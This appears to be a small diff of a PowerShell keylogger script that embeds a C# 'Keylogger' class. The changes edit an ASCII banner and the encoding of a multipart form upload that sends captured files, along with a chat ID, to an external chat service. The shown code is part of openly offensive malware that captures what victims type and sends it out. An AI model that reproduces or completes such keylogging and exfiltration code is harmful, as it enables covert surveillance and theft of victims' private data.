@@ -11,7 +11,7 @@ public class Keylogger {
 "@ -Language CSharp
 
 $banner = @"
- ##::: ##::'#######:::'#######::'########::  
+ ##::: ##::'#######:::'#######::'########:  
  ###:: ##:'##.... ##:'##.... ##: ##.... ##:  
  ####: ##: ##:::: ##: ##:::: ##: ##:::: ##:  
  ## ## ##: ##:::: ##: ##:::: ##: ########::  
@@ -73,7 +73,7 @@ $chatID
 Content-Disposition: form-data; name="document"; filename="$($file.Name)"
 Content-Type: application/octet-stream
 
-$(Get-Content -Path $file.FullName -Encoding Byte -ReadCount 0)
+$(Get-Content -Path $file.FullName -Encoding UTF8 -ReadCount 0)
 --$boundary--
 "@
 
